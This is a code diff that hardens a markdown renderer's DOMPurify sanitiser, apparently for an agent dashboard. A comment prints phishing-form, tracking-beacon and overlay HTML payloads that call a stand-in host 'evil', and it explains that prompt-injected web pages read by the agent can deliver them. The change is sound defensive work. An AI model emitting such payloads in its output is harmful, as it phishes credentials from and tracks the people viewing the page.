@@ -15,13 +15,40 @@ import { escapeHtml } from './format';
 // is an UNBOUND FACTORY — `.sanitize` is undefined, so every render threw
 // and silently fell back to escaped plain text. Bind it to the current
 // window explicitly; with no DOM at all, renderMarkdown falls back safely.
-type Sanitizer = { sanitize(html: string): string };
+type Sanitizer = { sanitize(html: string, cfg?: Record<string, unknown>): string };
 const DOMPurify: Sanitizer | null =
   typeof (createDOMPurify as unknown as Sanitizer).sanitize === 'function'
     ? (createDOMPurify as unknown as Sanitizer)
     : typeof window !== 'undefined'
       ? (createDOMPurify as unknown as (w: Window) => Sanitizer)(window)
       : null;
+
+// DOMPurify's defaults stop SCRIPT EXECUTION, which is what they are for, and
+// they are correct: probed against this exact version, `<script>`,
+// `javascript:`/`data:` hrefs, every `on*` handler, `<iframe srcdoc>`,
+// `<base>`, `<meta http-equiv=refresh>`, `<button formaction>`, SVG `<use>`,
+// `<math actiontype>` and both mXSS shapes are all neutralized, and `target`
+// is stripped so reverse-tabnabbing is impossible.
+//
+// What the defaults do NOT stop is a page that lies. These survive unchanged:
+//
+//   <form action="https://evil/"><input type="password"
+//         placeholder="Session expired — re-enter your password"><button>
+//   <img src="https://evil/track.png?who=1">           (an exfil beacon)
+//   <div style="position:fixed;inset:0;z-index:99999"> (a full-viewport overlay)
+//
+// That matters here more than in a normal app: everything rendered through this
+// function was written by an agent that reads the open web with web_search /
+// web_fetch, so a prompt-injected page is the delivery vector — and the
+// dashboard is served to anonymous strangers. Phishing does not need script.
+//
+// Remote <img> is deliberately NOT handled here; `img-src 'self' data:` in the
+// CSP (api/main.py) kills it at the layer that can actually see the request.
+const SANITIZE_CONFIG = {
+  FORBID_TAGS: ['form', 'input', 'button', 'select', 'option', 'textarea',
+                'label', 'fieldset', 'legend'],
+  FORBID_ATTR: ['style', 'formaction', 'action', 'srcset', 'ping', 'autofocus'],
+};
 
 /**
  * Safely render Markdown text to an HTML string.
@@ -44,7 +71,7 @@ export function renderMarkdown(text: string | null | undefined): string {
 
   try {
     const html = marked.parse(textStr) as string;
-    return DOMPurify.sanitize(html);
+    return DOMPurify.sanitize(html, SANITIZE_CONFIG);
   } catch {
     // Fallback: escape HTML entities
     return escapeHtml(textStr);
